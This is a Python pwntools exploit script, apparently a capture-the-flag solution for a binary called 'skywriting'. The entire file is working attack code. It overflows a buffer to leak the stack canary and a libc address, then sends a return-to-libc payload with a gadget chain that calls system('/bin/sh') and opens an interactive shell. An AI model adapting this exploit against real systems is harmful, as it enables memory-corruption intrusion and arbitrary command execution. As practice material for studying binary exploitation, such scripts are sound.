from pwn import *

libc = ELF("./bin/libc.so.6")

p = process("./bin/skywriting")

gdb.attach(p)
p.sendlineafter("?", "1")

p.sendafter(":", "A" * 0x89)
p.recvuntil("A" * 0x89)

leak = p.recvuntil("??", drop=True)
canary = "\x00" + leak[:7]
stk = u64(leak[7:].ljust(8, "\x00"))

print(hex(u64(canary)))
print(hex(stk))

p.sendafter(":", "A" * 0x98)
p.recvuntil("A" * 0x98)

leak = u64(p.recvuntil("??", drop=True).ljust(8, "\x00")) - 0x7f4358570b97 + 0x00007f435854f000
print(hex(leak))

p.sendafter(":", "\x00" * 0x88 + canary + "A" * 8 + p64(leak + 0x7b776) + p64(leak + 0x0007b775) + p64(leak + next(libc.search("/bin/sh"))) + p64(libc.symbols["system"] + leak))
p.sendlineafter(":", "notflag{a_cloud_is_just_someone_elses_computer}")

p.interactive()
